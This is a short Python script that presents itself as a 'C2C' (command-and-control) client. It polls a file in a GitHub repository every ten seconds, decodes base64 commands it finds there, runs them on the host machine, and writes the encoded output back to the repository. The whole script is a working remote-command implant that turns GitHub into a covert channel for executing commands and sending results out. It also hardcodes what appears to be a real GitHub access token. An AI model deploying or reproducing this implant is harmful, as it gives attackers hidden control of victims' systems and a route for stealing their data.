from github import Github
import subprocess
import time
import shlex
from base64 import b64decode, b64encode

print("[+] Starting C2C communication")
github_token = "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"  # Replace with your GitHub token
repo_name = 'demo99'

# Initialize GitHub client
github_client = Github(github_token)
user = github_client.get_user()
repo = user.get_repo(repo_name)

while True:
    try:
        # Get the contents of the 'test' file
        remote_command_file = repo.get_contents('test')
        remote_command = remote_command_file.content.strip()

        if remote_command:
            print("[+] Received new command:", remote_command)

            # Decode the command
            command = b64decode(remote_command).decode()

            # Execute the command if it's not empty
            if command:
                result = subprocess.check_output(shlex.split(command)).strip().decode()
                encoded_result = b64encode(result.encode()).decode()
                repo.update_file('test', 'Update result', encoded_result, remote_command_file.sha)
                print("[+] Result updated in the 'test' file.")
            else:
                print("[+] Empty command received, skipping execution.")

    except Exception as e:
        print("Error:", e)

    # Sleep for 10 seconds before checking for new commands
    time.sleep(10)